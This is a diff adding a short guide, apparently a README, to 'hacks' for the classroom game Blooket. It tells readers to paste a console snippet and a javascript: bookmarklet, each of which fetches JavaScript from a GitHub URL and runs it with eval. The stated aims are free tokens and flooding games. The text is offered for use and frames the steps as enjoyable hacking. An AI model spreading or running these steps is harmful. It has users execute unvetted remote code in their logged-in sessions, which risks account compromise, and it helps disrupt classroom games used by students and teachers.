@@ -1,0 +1,21 @@
+First Go blooket.com/play
+and go to inspect elemet [THIS REALLY WORKS]
+then go to Console and then copy/paste this script in there:
+
+fetch("https://raw.githubusercontent.com/DaCuteRaccoon/blooket/main/auto/app.js")
+.then((res) => res.text()
+.then((t) => eval(t)))
+
+
+This will give you 500 tokens every time you go to blooket.
+MORE HACKS(flood game and other stuff) : 
+type in URL : 
+
+javascript:fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/main.js").then((res) => res.text().then((t) => eval(t)))
+
+this will get you to school hacks website where you can see more hacks ENJOY HACKING!
+NOTE : 
+if these hacks don't work thengo to the DaCuteRaccoon's github page where he has more
+hacks!!! 
+website to more hacks : https://github.com/DaCuteRaccoon/blooket
+now....ENJOY HACKING!
